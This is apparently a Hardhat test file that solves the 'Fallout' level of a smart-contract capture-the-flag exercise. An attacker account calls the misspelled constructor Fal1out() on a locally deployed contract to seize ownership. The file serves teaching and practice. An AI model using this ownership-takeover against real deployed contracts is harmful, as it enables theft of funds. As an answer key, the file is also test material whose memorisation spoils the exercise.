// Goals
// Claim ownership of the contract

import { ContractFactory, Signer } from "ethers"
import { Fallout } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Fallout', function () {
  let Fallout: ContractFactory
  let fallout: Fallout

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    Fallout = await ethers.getContractFactory('Fallout')
    fallout = (await Fallout.deploy()) as Fallout

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should claim ownership of the contract', async function () {
    await fallout.connect(attacker).Fal1out()
    expect(await fallout.owner()).to.equal(await attacker.getAddress())
  })
})